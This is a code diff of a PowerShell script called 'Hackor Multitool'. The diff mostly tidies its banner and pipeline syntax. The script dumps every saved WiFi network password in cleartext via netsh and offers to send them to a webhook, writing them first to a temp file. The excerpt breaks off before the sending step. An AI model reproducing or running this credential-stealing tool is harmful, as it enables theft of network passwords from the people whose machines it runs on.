@@ -1,6 +1,7 @@
 function Show-Menu {
     Clear-Host
-    Write-Host " ________  _______   ________  ________  _______   ________     
+    Write-Host @"
+ ________  _______   ________  ________  _______   ________     
 |\   ___ \|\  ___ \ |\   ___ \|\   ____\|\  ___ \ |\   ____\    
 \ \  \_|\ \ \   __/|\ \  \_|\ \ \  \___|\ \   __/|\ \  \___|    
  \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \_____  \ \  \_|/_\ \  \       
@@ -9,7 +10,8 @@ function Show-Menu {
     \|_______|\|_______|\|_______|\_________\|_______|\|_______|
                                  \|_________|                   
                                                                 
-                                                                "
+                                                                
+"@
     Write-Host "================ Hackor Multitool ================"
     Write-Host "1: List WiFi Passwords"
     Write-Host "2: Option Two"
@@ -26,14 +28,14 @@ do {
             Clear-Host
             Write-Host "================ Hackor Multitool -> WiFi Networks ================"
             Write-Host "Scanning saved WiFi Networks..."
-            $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+            $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
             Write-Host $wifiProfiles
             Write-Host "1: Send to webhook"
             Write-Host "2: Back"
             $selection2 = Read-Host "Please make a selection"
             switch ($selection2) {
                 '1' {
-                    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+                    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
                     $filePath = "$env:TEMP/--wifi-pass.txt"
                     $wifiProfiles | Out-File -FilePath $filePath
                     
